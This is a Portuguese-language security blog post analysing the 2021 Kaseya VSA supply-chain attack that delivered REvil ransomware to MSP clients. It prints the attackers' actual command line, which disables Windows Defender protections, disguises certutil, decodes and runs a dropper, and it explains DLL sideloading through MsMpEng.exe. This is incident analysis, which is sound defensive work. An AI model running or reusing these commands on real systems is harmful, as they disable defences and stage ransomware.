<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Kaseya Supply Chain Attack" /><meta name="author" content="Odysseus" /><meta property="og:locale" content="en" /><meta name="description" content="Introdução" /><meta property="og:description" content="Introdução" /><link rel="canonical" href="https://hackermindset.me/posts/kaseya-supply-chain-attack/" /><meta property="og:url" content="https://hackermindset.me/posts/kaseya-supply-chain-attack/" /><meta property="og:site_name" content="Hacker Mindset" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kaseya Supply Chain Attack" /><meta name="twitter:site" content="@ualvesdias" /><meta name="twitter:creator" content="@Odysseus" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Odysseus"},"dateModified":"2022-05-09T04:55:11+00:00","datePublished":"2021-07-05T00:00:00+00:00","description":"Introdução","headline":"Kaseya Supply Chain Attack","mainEntityOfPage":{"@type":"WebPage","@id":"https://hackermindset.me/posts/kaseya-supply-chain-attack/"},"url":"https://hackermindset.me/posts/kaseya-supply-chain-attack/"}</script><title>Kaseya Supply Chain Attack | Hacker Mindset</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker Mindset"><meta name="application-name" content="Hacker Mindset"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/ualvesdias/ualvesdias.github.io/main/assets/img/HAL9000.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker Mindset</a></div><div class="site-subtitle font-italic">Experiment. Fail. Learn. Hack. Repeat.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ualvesdias" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ualvesdias" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ulisses.alves','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Kaseya Supply Chain Attack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kaseya Supply Chain Attack</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ualvesdias">Odysseus</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1625443200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-07-05 </em> </span> <span> Updated <em class="timeago" data-ts="1652072111" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1349 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="introdução">Introdução</h1><p>Há alguns dias atrás, a comunidade de segurança ao redor do mundo precisou se ocupar com o apelidado <a href="https://news.sophos.com/pt-br/2021/07/01/vulnerabilidade-printnightmare-o-que-fazer/">PrintNightmare</a>. Uma falha crítica foi identificada no serviço de impressão do sistema operacional Windows e que afeta diversas versões do software, inclusive aquelas usadas em Domain Controllers.</p><p>Dois dias adentro, contudo, outro evento ocorreu que, a princípio, foi ofuscado pelo que já estava ocorrendo. Um ataque de proporções exponenciais ao software <a href="https://www.kaseya.com/products/vsa/">VSA</a> da empresa <a href="https://www.kaseya.com/">Kaseya</a> comprometeu milhares de clientes de dezenas de <a href="https://www.opservices.com.br/msps-managed-service-providers/">MSPs</a> nos Estados Unidos.</p><p>De acordo com as fontes consultadas, o software VSA da empresa foi comprometido por um <a href="https://www.fireeye.com/current-threats/what-is-a-zero-day-exploit.html">0-day</a> que permitiu que uma atualização falsa fosse emitida para os clientes dos MSPs que usam a opção <em>on premisses</em>. A imagem abaixo pode ilustrar melhor a cadeia de ataque:</p><p><img data-src="https://miro.medium.com/max/700/1*-g54lZpCuxwF6_wRR5UAgQ.png" alt="" data-proofer-ignore></p><p>Cadeia de ataque ao Kaseya VSA e clientes dos MSPs</p><p>Como pode ser visto acima, os atacantes exploraram dezenas de servidores VSA que estavam expostos na internet e induziram atualizações falsas aos agentes instalados nos clientes.</p><p>O mais agravante desse ataque é o fato de que os agentes nos clientes são executados com permissões elevadas, o que permite plenos poderes ao ataque. Com isso, foi possível, por exemplo, emitir comandos para desabilitar diversas proteções nos <em>endpoints</em> afetados, como o Windows Defender.</p><h1 id="detalhes-técnicos-do-ataque">Detalhes Técnicos do Ataque</h1><p>O ataque, inicialmente, explorou falhas como <em>bypass</em> de mecanismo de autenticação, <em>upload</em> de arquivos arbritários e até injeção de código nos servidores VSA.</p><p>A partir daí, um prodecimento foi agendado para enviar uma atualização falsa a todos os computadores gerenciados pelos servidores afetados. Tal atualização incluía ações de desabilitar proteções e download/desofuscação e execução de um <a href="https://www.kaspersky.com/resource-center/threats/ransomware">ransomware</a> da gang <a href="https://en.wikipedia.org/wiki/REvil">REvil</a>, que opera o chamado <em>Ransomware-As-A-Service</em>, ou seja, eles vendem ransomware como um serviço. Abaixo temos parte dos comandos que foram executados nos clientes afetados:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>execFile(): Path="C:\windows\system32\cmd.exe", arg="/c ping 127.0.0.1 -n 7615 &gt; nul &amp; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp; copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe &amp; echo %RANDOM% &gt;&gt; C:\Windows\cert.exe &amp; C:\Windows\cert.exe -decode c:\kworking1\agent.crt c:\kworking1\agent.exe &amp; del /q /f c:\kworking1\agent.crt C:\Windows\cert.exe &amp; c:\kworking1\agent.exe", flag=0x00000002, timeout=0 seconds
</pre></table></code></div></div><p>Analisando o bloco acima:</p><ul><li><em>execFile(): Path=”C:\windows\system32\cmd.exe”, arg=”/c ping 127.0.0.1 -n 7615 &gt; null”</em></ul><p>A primeira parte do código invoca o <em>cmd.exe</em> e passa como argumentos primeiramente o comando <em>ping</em> para o localhost (127.0.0.1), especificando exatamente 7615 pacotes a serem enviados e descartando quaisquer saídas textuais (<em>&gt; null</em>). O objetivo desse comando <em>ping</em> provavelmente é o de causar um atraso no processo de decodificação e execução do <em>dropper</em> e do <em>ransomware</em>. Essa abordagem pode ser útil em alguns casos para enganar os mecanismos de defesa (que ainda estão ativos).</p><ul><li><em>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</em> <strong><em>Set-MpPreference</em></strong> <em>-</em><strong><em>DisableRealtimeMonitoring</em></strong> <em>$true -</em><strong><em>DisableIntrusionPreventionSystem</em></strong> <em>$true -</em><strong><em>DisableIOAVProtection</em></strong> <em>$true -</em><strong><em>DisableScriptScanning</em></strong> <em>$true -</em><strong><em>EnableControlledFolderAccess</em></strong> <em>Disabled -</em><strong><em>EnableNetworkProtection</em></strong> <em>AuditMode -Force -</em><strong><em>MAPSReporting</em></strong> <em>Disabled -</em><strong><em>SubmitSamplesConsent</em></strong> <em>NeverSend</em></ul><p>A seguir, ainda como argumento passado ao <em>cmd.exe</em>, é chamado o <em>powershell.exe,</em> que executa o comando <a href="https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps"><strong><em>Set-MpPreference</em></strong></a>, que permite alterar configurações do Windows Defender. Para ele são passadas as opções a seguir:</p><ul><li>-<strong>DisableRealtimeMonitoring</strong> $true: Desabilita a proteção em tempo real.<li>-<strong>DisableIntrusionPreventionSystem</strong> $true: desabilita proteção de rede para vulnerabilidades conhecidas.<li>-<strong>DisableIOAVProtection</strong> $true: Desabilita a verificação de arquivos e anexos baixados.<li>-<strong>DisableScriptScanning</strong> $true: desabilita a verificação de <em>scripts</em> durante a verificação de <em>malware.</em><li>-<strong>EnableControlledFolderAccess</strong> Disabled: Desabilita a proteção de arquivos contra <em>ransomware</em> e outras ameaças.<li>-<strong>EnableNetworkProtection</strong> AuditMode -Force: Desabilita a proteção contra acesso a domínios potencialmente perigosos e maliciosos, como domínios utilizados por campanhas de phishing, servidores de comando e controle e até mesmo de controle de <em>ransomware.</em><li>-<strong>MAPSReporting</strong> Disabled: Desabilita o envio de informações ao <a href="https://www.microsoft.com/security/blog/2015/01/14/maps-in-the-cloud-how-can-it-help-your-enterprise/"><em>Microsoft Active Protection Service (MAPS</em></a><em>)</em><li>-<strong>SubmitSamplesConsent</strong> NeverSend: Desabilita o envio automático de <em>samples</em> para a Microsoft.</ul><p>Após desabilitar as proteções, é iniciado o processo de execução do <em>ransomware</em>, que começa utilizando o comando a seguir:</p><ul><li><em>copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe &amp; echo %RANDOM% » C:\Windows\cert.exe</em></ul><p>O comando acima cria uma cópia do utilitário <em>certutil.exe,</em> cujo nome é <em>cert.exe.</em> Após isso, é acrescentado um número aleatório ao final do arquivo novo:</p><p><img data-src="https://miro.medium.com/max/700/1*RqM9d8Qe0p-rQAchgLTteQ.png" alt="" data-proofer-ignore></p><p>Manipulação do utilitário <em>certutil.exe</em></p><p>A técnica acima pode ter sido feita para alterar a assinatura do executável original, já que, além do nome “certutil”, o <em>hash</em> dele pode ser monitorado ativamente para detecção de execuções maliciosas.</p><ul><li><em>C:\Windows\cert.exe -decode c:\kworking1\agent.crt c:\kworking1\agent.exe &amp; del /q /f c:\kworking1\agent.crt C:\Windows\cert.exe &amp; c:\kworking1\agent.exe</em></ul><p>Seguindo o fluxo de execução, é possível ver que o novo arquivo <em>cert.exe</em> é usado para realizar a decodificação <em>base64</em> do arquivo <em>agent.crt</em>, que provavelmente foi colocado em todos os <em>endpoints</em> afetados pelo processo de atualização falsa. Em seguida, o novo arquivo, <em>agent.exe,</em> é criado e depois <em>agent.crt e cert.exe</em> são deletados. Finalmente, <em>agent.exe</em> é executado.</p><p><em>agent.exe</em> é um executável conhecido como <em>dropper</em>, que tem por função baixar e executar o código malicioso final, ou seja, o <em>ransomware.</em> Neste caso, ele baixou um executável legítimo do Windows Defenter, o <em>MsMpEng.exe</em>, e também uma DLL chamada <em>mpsvc.dll</em>, <strong>que é o <em>ransomware</em> propriamente dito</strong>. Entretanto, legitimamente falando, <a href="https://www.fileinspect.com/fileinfo/mpsvc-dll/"><em>MpSvc.dll</em></a> é uma biblioteca que faz parte do <em>Windows Protection Service</em>, e é utilizada pelo Windows Defender. Esse mecanismo foi utilizado no ataque provavelmente como forma de execução disfarçada do <em>ransomware</em>.</p><p>A execução do arquivo <em>MsMpEng.exe</em> carrega automaticamente a DLL <em>MpSvc.dll</em>, que inicia o processo de criptografia dos arquivos do sistema afetado.</p><p>Uma vez afetado, o sistema passa a ficar assim:</p><p><img data-src="https://miro.medium.com/max/680/1*SUJhOu3hOeiRy-mMi3vdNA.png" alt="" data-proofer-ignore></p><p>Sistema afetado pelo ransomware REvil no ataque de Suplly Chain do Kaseya VSA</p><p><img data-src="https://miro.medium.com/max/700/1*trhkTGQ_NYzk_cOnuA17vQ.png" alt="" data-proofer-ignore></p><p>Instruções de preço e pagamento pelo processo de descriptografia dos arquivos</p><h1 id="evolução-do-cenário">Evolução do Cenário</h1><p>A partir do momento que foi detectado, a comunidade de segurança logo começou a agir para investigar o incidente e realizar medidas de mitigação do ataque. O que segue abaixo é uma <em>timeline</em> de ações e notícias:</p><p>No dia 3 de julho a Kaseya <a href="https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021">confirmou o ataque</a>. A partir daí várias informações de impacto começaram a surgir:</p><ul><li>Mais de 30 MSPs foram afetados ao redor do mundo;<li>Rede de supermercados sueca Coop fechou mais de 400 lojas na sexta-feira depois de seus pontos de venda e <em>checkouts</em> terem parado de funcionar;<li><a href="https://www.nzherald.co.nz/nz/worldwide-ransomware-attack-st-peters-college-and-10-other-schools-hit-by-us-cyber-attack/JACHAD3OPGUOF7ZIF4PJXDPICA/">11 escolas afetadas pelo ataque</a>;<li>Falha do software VSA provavelmente foi um 0-day de <em>bypass</em> de mecanismo de autenticação da interface web;<li>Equipe de pesquisadores alemães estavam em processo de <a href="https://twitter.com/0xDUDE/status/1411466263411544064?s=20"><em>responsible disclosure</em> com a Kaseya</a> no momento do ataque;<li>A empresa <em>MawareBytes</em> detecta um aumento considerável do uso do <em>ransonware</em> REvil ao redor do mundo;</ul><p><img data-src="https://miro.medium.com/max/700/1*Bnjg70-AQk85tUqQNoOlvA.png" alt="" data-proofer-ignore></p><p>Aumento de detecções do malware REvil</p><ul><li>A gangue REvil se responsabilizou pelo ataque e exigiu a quantia de US$70.000.000,00 em BTC para liberar um <em>decryptor</em> para todos os afetados;</ul><p><img data-src="https://miro.medium.com/max/698/1*tsdFjpgPB9ArqCyHyxCD5A.png" alt="" data-proofer-ignore></p><ul><li>A Kaseya liberou no dia 5 de julho uma ferramenta de <a href="https://kaseya.app.box.com/s/0ysvgss7w48nxh8k1xt7fqhbcjxhas40">detecção de comprometimento</a>, mas pede que todos os servidores VSA <em>on premisses</em> permaneçam <em>offline</em>.<li>A empresa <a href="https://www.huntress.com/">HuntressLabs</a>, por meio do <a href="https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/"><em>update</em> 12 na <em>thread</em> no Reddit</a>, afirmou que o vetor inicial de ataque foi um <em>bypass</em> no mecanismo de autenticação da interface web, garantindo uma sessão autenticada ao atacante e, após isto, realizar o <em>upload</em> do <em>payload</em> original e executar comandos via falhas de SQL <em>injection</em>.</ul><h1 id="conclusão">Conclusão</h1><p>A investigação ainda está em andamento, até o momento da escrita deste post, mas já é possível dizer que este é um dos maiores ataques cibernéticos da história.</p><p>Assim que mais atualizações forem acontecendo, eu altero o post original para incluir os avanços.</p><h1 id="referências">Referências</h1><ul><li><a href="https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/">Kaseya supply chain attack targeting MSPs to deliver REvil ransomware — TRUESEC Blog</a><li><a href="https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b">Kaseya supply chain attack delivers mass ransomware event to US companies</a><li><a href="https://twitter.com/markloman/status/1411053456983564300">Mark Loman @🏡 no Twitter: “If your endpoint is hit, the initial ransom demand is 44,999 USD. https://t.co/gSWbxYJbeX” / Twitter</a><li><a href="https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/">Crticial Ransomware Incident in Progress : msp (reddit.com)</a><li><div class="table-wrapper"><table><tbody><tr><td>[UPDATED: Thousands attacked as REvil ransomware hijacks Kaseya VSA — Malwarebytes Labs<td>Malwarebytes Labs](https://blog.malwarebytes.com/cybercrime/2021/07/shutdown-kaseya-vsa-servers-now-amidst-cascading-revil-attack-against-msps-clients/#detection-tool)</table></div><li><a href="https://twitter.com/nicoleperlroth/status/1411461006786588673">Nicole Perlroth no Twitter: “As it turns out, the “zero day” used to breach Kesaya wasn’t a zero day. Dutch researchers tipped the company off to the issue, but Kesaya still hadn’t rolled out a patch when REvil used it for its ransomware spree.” / Twitter</a><li><a href="https://www.nzherald.co.nz/nz/worldwide-ransomware-attack-st-peters-college-and-10-other-schools-hit-by-us-cyber-attack/JACHAD3OPGUOF7ZIF4PJXDPICA/">Worldwide ransomware attack: St Peter’s College and 10 other schools hit by US cyber attack — NZ Herald</a><li><a href="https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021">Important Notice July 4th, 2021 — Kaseya</a><li><div class="table-wrapper"><table><tbody><tr><td>[Set-MpPreference (Defender)<td>Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps)</table></div><li><div class="table-wrapper"><table><tbody><tr><td>[Ativar a proteção de rede<td>Microsoft Docs](https://docs.microsoft.com/pt-br/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide)</table></div><li><a href="https://www.fileinspect.com/fileinfo/mpsvc-dll/">MpSvc.dll — What is MpSvc.dll? — Service Module (fileinspect.com)</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kaseya Supply Chain Attack - Hacker Mindset&amp;url=https://hackermindset.me/posts/kaseya-supply-chain-attack/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kaseya Supply Chain Attack - Hacker Mindset&amp;u=https://hackermindset.me/posts/kaseya-supply-chain-attack/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://hackermindset.me/posts/kaseya-supply-chain-attack/&amp;text=Kaseya Supply Chain Attack - Hacker Mindset" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/white-box-penetration-testing-cheating-in-order-to-boost-impact-and-value/">White Box Penetration Testing: 'Cheating' in order to boost impact and value</a><li><a href="/posts/using-aws-api-gateway-as-a-bypass-for-ip-based-rate-limiting/">Using AWS API Gateway as a bypass for IP based rate limiting</a><li><a href="/posts/matchbox-machine-that-learns/">A Matchbox Machine that Learns</a><li><a href="/posts/bypassing-mobile-phone-number-verification/">Bypassing Phone Number Verification</a><li><a href="/posts/using-tmux-for-automating-interactive-reverse-shells/">Using tmux for automating interactive reverse shells</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/infosec/">infosec</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/api-gateway/">api-gateway</a> <a class="post-tag" href="/tags/authorization/">authorization</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/burp-suite/">burp-suite</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/documentation/">documentation</a> <a class="post-tag" href="/tags/learning/">learning</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/using-aws-api-gateway-as-a-bypass-for-ip-based-rate-limiting/"><div class="card-body"> <em class="timeago small" data-ts="1662163200" > 2022-09-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Using AWS API Gateway as a bypass for IP based rate limiting</h3><div class="text-muted small"><p> This is how you can bypass any IP based rate limiting defenses in your red teaming/pentesting engagements: An AWS Free Tier account and an API Gateway HTTP Proxy The situation Imagine you are...</p></div></div></a></div><div class="card"> <a href="/posts/using-tmux-for-automating-interactive-reverse-shells/"><div class="card-body"> <em class="timeago small" data-ts="1625184000" > 2021-07-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Using tmux for automating interactive reverse shells</h3><div class="text-muted small"><p> Automating the process of converting a non-interactive reverse shell to a fully interactive TTY. Introduction I’ve recently read agreat post about using the “expect” command line utility fo...</p></div></div></a></div><div class="card"> <a href="/posts/white-box-penetration-testing-cheating-in-order-to-boost-impact-and-value/"><div class="card-body"> <em class="timeago small" data-ts="1612483200" > 2021-02-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>White Box Penetration Testing: 'Cheating' in order to boost impact and value</h3><div class="text-muted small"><p> Almost every professional pentester is always thrilled when a black box pentesting comes along, however it’s probably in white box that you’ll be able to give your reports more meaning. Introduc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/using-tmux-for-automating-interactive-reverse-shells/" class="btn btn-outline-primary" prompt="Older"><p>Using tmux for automating interactive reverse shells</p></a> <a href="/posts/using-aws-api-gateway-as-a-bypass-for-ip-based-rate-limiting/" class="btn btn-outline-primary" prompt="Newer"><p>Using AWS API Gateway as a bypass for IP based rate limiting</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ualvesdias">Odysseus</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/infosec/">infosec</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/api-gateway/">api-gateway</a> <a class="post-tag" href="/tags/authorization/">authorization</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/burp-suite/">burp-suite</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/documentation/">documentation</a> <a class="post-tag" href="/tags/learning/">learning</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
